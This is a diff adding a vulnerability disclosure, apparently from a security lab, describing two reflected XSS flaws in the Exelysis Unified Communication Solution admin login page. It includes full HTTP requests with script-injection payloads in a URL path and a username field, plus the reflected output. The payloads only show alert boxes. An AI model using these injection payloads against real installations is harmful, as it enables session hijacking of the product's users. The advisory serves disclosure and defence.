@@ -1,0 +1,60 @@
+Reflected XSS (Cross-Site Scripting) attacks
+
+Type: Unauthenticated Remote attacks
+
+We have identified that the “eucsAdmin login” web page of “Exelysis Unified Communication Solution (EUCS)” product is vulnerable to "Reflective" Cross-site scripting (XSS) in two injection points. This is due to that the Web App fails to adequately sanitize request strings of malicious JavaScript. By leveraging this issue, an attacker is able to cause arbitrary HTML and JavaScript code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+
+
+Reflected XSS 1
+
+Request:
+GET /login.php/%22%3E%3Cscript%3Ealert(%22IthacaLabs%22)%3C/script%3E%22%3Cform%20name=%22form%22%20action=%22/login.php HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: redirect=1; testing=1; PHPSESSID=something
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+Affected Code:
+<form name="form" action="/login.php/"><script>alert("IthacaLabs")</script>"<form name="form" action="/login.php" method="post" target="_self" class="form-horizontal" style="margin-bottom: 0px !important;">
+
+
+
+
+Reflected XSS 2
+
+Request:
+POST /_/login.php HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Origin: https://1.1.1.1
+Connection: close
+Referer: https://1.1.1.1/_/login.php
+Cookie: redirect=1; testing=1; PHPSESSID=something
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=test"><script>alert("XSSbyIthacaLabs");</script><input id="username&password=test
+
+
+Affected Code:
+<input id="username" name="username" type="text" class="form-control" placeholder="Username" value="test"><script>alert("XSSbyIthacaLabs");</script><input id="username">
+
+
+
